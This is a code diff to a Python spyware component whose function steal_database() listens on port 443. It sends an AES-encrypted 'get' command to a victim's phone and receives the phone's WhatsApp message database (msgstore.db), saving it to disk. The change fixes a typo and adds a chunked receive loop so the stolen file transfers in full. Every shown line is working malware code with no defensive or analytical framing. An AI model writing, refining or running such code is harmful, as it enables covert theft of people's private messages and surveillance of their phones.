@@ -16,7 +16,7 @@ def steal_database():
     iv = "5468697320697320616e204956343536"
     obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
     ciphertext = obj.encrypt(b"get" + b"\x00" * 13)
-    print("The get command nhas been encrypted")
+    print("The get command has been encrypted")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     port = 443             
     s.bind(('', port))
@@ -29,10 +29,12 @@ def steal_database():
         conn.send(ciphertext)
         print("Encrypted 'get database' command sent to phone")
         count += 1
-        database = conn.recv()
-        db = open("msgstore.db", "w+")
-        db.write(database)
-        db.close()
+        with open("msgstore.db", "w+") as db:
+            database = conn.recv(2048)
+            while database:
+                db.write(database)
+                database = conn.recv(2048)
+            db.write(database)
     
 
 # Parses WhatsApp message database and stores the messages in a dictionary
